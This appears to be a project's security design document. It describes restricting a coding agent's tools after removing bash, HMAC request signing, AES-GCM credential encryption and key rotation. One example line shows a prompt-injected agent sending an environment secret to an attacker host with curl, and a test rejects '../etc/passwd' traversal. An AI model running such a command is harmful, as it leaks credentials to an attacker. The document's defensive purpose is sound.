# Security Boundary — HMAC Trust + Credential Cipher + Key Rotation

This document covers security primitives that protect the CP ↔ workspace trust boundary.

---

## 1. Coding-Agent Capability Constraints (Sprint 15 Story 01)

The coding agent's tool set is constrained to a narrow set of operations. The `bash` tool (which
allowed arbitrary shell commands) was removed in Sprint 15 Story 01. It is replaced by six narrow
replacement tools that each accept no arbitrary arguments:

| Tool                      | Command              | Description                                                                  |
| ------------------------- | -------------------- | ---------------------------------------------------------------------------- |
| `npm_test`                | `pnpm test`          | Run the workspace test suite                                                 |
| `npm_build`               | `pnpm build`         | Compile the workspace                                                        |
| `npm_typecheck`           | `pnpm typecheck`     | TypeScript type-check without a full build                                   |
| `git_status_readonly`     | `git status --short` | Read-only view of modified files — no commit or push                         |
| `read_package_json(name)` | —                    | Read `node_modules/<name>/package.json`; validates name to prevent traversal |
| `list_installed_packages` | —                    | List `dependencies` + `devDependencies` keys from workspace `package.json`   |

**What this closes**: the trivial shell-escape path where a prompt-injected task could call
`bash({command: "curl https://attacker.com/$(printenv AUTH_SECRET)"})`.

**What this does NOT close**: workflow nodes can still `fetch` arbitrary URLs (tracked in the
egress-declaration backlog). Full process isolation is a Sprint 20+ story.

**Validation**: `pnpm --filter @platform/workspace-mcp test:unit` includes:

- `test/tools/AgentTools.no-bash.test.ts` — asserts `bash` is not in the registry.
- `test/tools/AgentTools.bash-regression.test.ts` — stubs an LLM to attempt `bash`; asserts
  `NoSuchToolError` is returned cleanly (no hang).
- `test/tools/ReadPackageJsonTool.test.ts` — rejects `../etc/passwd`, slash paths, dotdot.

---

## 2. HMAC Trust Boundary

All server-to-server requests between the control plane (CP) and a workspace installation
are authenticated with HMAC-SHA256 over a per-workspace shared secret (the "pairing secret").
The framework implementation lives in `packages/host/src/pairing/`.

See [`docs/pairing-protocol.md`](pairing-protocol.md) for the full wire protocol.

### Key properties

- **Algorithm**: HMAC-SHA256. The base string covers `METHOD`, `path`, `ts`, `nonce`, and `sha256(body)`.
- **Replay prevention**: `IncomingHmacVerifier` rejects any nonce it has already seen within a 10-minute
  window. The nonce cache is keyed by `${workspaceId}:${nonce}`.
- **Clock skew**: Requests with `|now − ts| > 300 seconds` (5 minutes) are rejected.
- **Constant-time comparison**: `timingSafeEqual` is used for the signature comparison to prevent
  timing side-channel leaks.
- **Missing secret guard**: `IncomingHmacVerifier.verify` throws an explicit error if the `pairingSecret`
  is empty, preventing silent signature-mismatch failures from masking misconfiguration.

### In-memory nonce cache — documented limitation

The nonce cache is **in-memory and per-process**. This means:

- Replay protection works within the lifetime of a single server process.
- Restarting the server resets the nonce cache. A replayed request arriving after a restart
  will be accepted if its timestamp is still within the 5-minute skew window.
- The test suite explicitly documents this: `IncomingHmacVerifier.test.ts` asserts that the
  same nonce is rejected by the original verifier instance, but accepted by a newly created
  instance (see "nonce replay protection is per-instance" test case).

**Out of scope for now**: a persistent nonce store (e.g. Redis with TTL). That would close the
restart window but is not needed for the current threat model. If this matters for your deployment,
rotate the pairing secret after every restart (the rotation clears the CP's memory of old nonces).

---

## 3. Credential Cipher — AES-256-GCM at Rest

Every database-managed credential's secret material is encrypted at rest with AES-256-GCM.
Implementation: `packages/host/src/domain/credentials/CredentialSecretCipher.ts`.

### Key derivation

The AES-256 key is derived as `sha256(CODEMATION_CREDENTIALS_MASTER_KEY)`, producing a 32-byte key.
The `encryptionKeyId` stored alongside each ciphertext is the first 12 hex characters of the same hash,
used to detect key rotation at decrypt time.

### Encryption envelope

Each ciphertext is a single base64 blob: `[12-byte IV | 16-byte GCM auth tag | ciphertext]`.
A new random IV is generated for every encryption call — two encryptions of identical plaintext
produce different ciphertexts.

### Failure modes

| Situation                                                   | Error                                                           |
| ----------------------------------------------------------- | --------------------------------------------------------------- |
| `CODEMATION_CREDENTIALS_MASTER_KEY` env var absent or empty | `Error: CODEMATION_CREDENTIALS_MASTER_KEY is required…`         |
| `encryptionKeyId` of stored ciphertext ≠ current key's id   | `CredentialKeyRotatedError` (includes stored key id in message) |
| Ciphertext tampered / corrupted                             | Node.js crypto throws with auth-tag validation error            |

The order of checks in `decrypt` is: missing env → key id mismatch → AES-GCM decryption.
This ensures the correct error is thrown even when the env changes.

---

## 4. Cipher Key Rotation Contract

When `CODEMATION_CREDENTIALS_MASTER_KEY` is changed (rotated), any credential encrypted with the
old key will **fail loudly** at decrypt time with `CredentialKeyRotatedError`.

### What this means for operators

- **Do not** change `CODEMATION_CREDENTIALS_MASTER_KEY` without planning a credential re-bind pass.
- After rotating the key, any workflow that uses an affected credential will fail to load its
  secret material. The error surfaces as a `CredentialKeyRotatedError`, which the framework
  treats as a credential re-bind prompt (the credential record itself is not destroyed).
- To migrate: re-bind each affected credential through the UI. The re-bind flow re-encrypts the
  material with the new key.

### What is NOT done automatically

- **No auto re-encryption**: the framework does not silently re-encrypt all credentials when the
  key changes. Fail loudly is the contract; auto-migration is a separate (future) story.
- **No KMS integration**: the master key lives in an env var. KMS-backed key management is out of scope.

### Audit trail

A `CredentialKeyRotatedError` propagating through a credential handler is treated as a handler-level
failure and, where Story B audit logging is active, produces an audit row tagged
`outcome: failure, errorCode: credential.key_rotated`.

---

## 5. Pairing Secret Rotation

When a workspace's pairing secret is rotated via the control-plane admin API:

1. The new secret replaces the old secret immediately (no grace window).
2. The CP clears the nonce-cache slice for that workspace, so nonces signed with the old secret
   cannot be replayed even within the nonce TTL window.
3. Any in-flight request signed with the old secret that arrives after rotation will be rejected
   with a 401 because the HMAC will not verify against the new secret.

If a grace window is needed, generate a third secret (v3) before rotating v2. The framework does
not support multi-secret rotation natively; that is a separate future story.
